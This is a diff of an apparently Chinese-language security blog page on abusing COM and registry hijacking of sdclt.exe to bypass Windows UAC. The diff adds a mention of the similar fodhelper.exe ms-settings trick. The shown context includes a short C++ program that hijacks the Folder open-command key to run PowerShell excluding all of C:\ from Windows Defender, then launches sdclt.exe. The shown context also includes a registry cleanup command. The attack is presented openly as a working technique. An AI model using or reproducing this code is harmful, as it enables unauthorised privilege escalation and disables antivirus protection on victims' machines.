@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://clovershrub.github.io/img/COM%E5%8A%AB%E6%8C%81sdclt%E6%8F%90%E6%9D%83/cover.png">
 <meta property="article:published_time" content="2024-01-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-01-24T03:29:47.438Z">
+<meta property="article:modified_time" content="2024-01-24T07:01:54.068Z">
 <meta property="article:author" content="Clovershrub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://clovershrub.github.io/img/COM%E5%8A%AB%E6%8C%81sdclt%E6%8F%90%E6%9D%83/cover.png"><link rel="shortcut icon" href="/img/blogs/avatar.jpg"><link rel="canonical" href="https://clovershrub.github.io/2024/01/23/COM%E5%8A%AB%E6%8C%81sdclt%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
@@ -55,7 +55,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-01-24 11:29:47'
+  postUpdate: '2024-01-24 15:01:54'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -206,6 +206,7 @@
 <p>此后再次执行sdclt.exe就会弹出管理员权限的cmd窗口。<br><img src="/img/COM%E5%8A%AB%E6%8C%81sdclt%E6%8F%90%E6%9D%83/COM%E5%8A%AB%E6%8C%81sdclt%E6%8F%90%E6%9D%83.png"><br>环境恢复：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete <span class="string">&quot;HKCU\Software\Classes\Folder\shell\open\command&quot;</span> /f</span><br></pre></td></tr></table></figure>
 
+<p>与之类似的还有伪造<code>HKCU:\Software\Classes\ms-settings\Shell\Open\Command</code>后执行<code>C:\Windows\system32\fodhelper.exe</code>等。</p>
 <h2 id="PE文件版"><a href="#PE文件版" class="headerlink" title="PE文件版"></a>PE文件版</h2><p>比如下面这段代码，他就可以将C盘放入WindowsDfender查杀的白名单里：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;reg add \&quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command\&quot; /d \&quot;powershell.exe \\\&quot;Set-MpPreference -ExclusionPath \\\&quot;C:\\*\\\&quot;\\\&quot;\&quot; /f&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;reg add \&quot;HKCU\\Software\\Classes\\Folder\\shell\\open\\command\&quot; /v \&quot;DelegateExecute\&quot; /f&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;C:\\Windows\\system32\\sdclt.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
